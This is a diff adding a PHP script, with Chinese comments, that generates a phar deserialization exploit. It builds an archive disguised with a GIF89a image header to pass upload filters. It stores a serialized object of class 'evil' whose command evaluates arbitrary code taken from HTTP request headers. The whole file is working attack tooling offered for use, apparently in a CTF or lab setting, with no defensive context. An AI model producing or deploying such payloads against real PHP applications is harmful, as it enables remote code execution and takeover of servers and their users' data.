@@ -1,0 +1,19 @@
+<?php
+
+class evil{
+    public $cmd;
+    public $a;
+
+}
+
+@unlink('test.phar');   //删除之前的test.par文件(如果有)
+$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀
+$phar->startBuffering();  //开始写文件
+$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');  //写入stub
+$o=new evil();
+$o->cmd='print_r(getallheaders());eval(reset(getallheaders()));__halt_compiler();';
+$phar->setMetadata($o);//写入meta-data
+$phar->addFromString("test.txt","test");  //添加要压缩的文件
+$phar->stopBuffering();
+?>
+
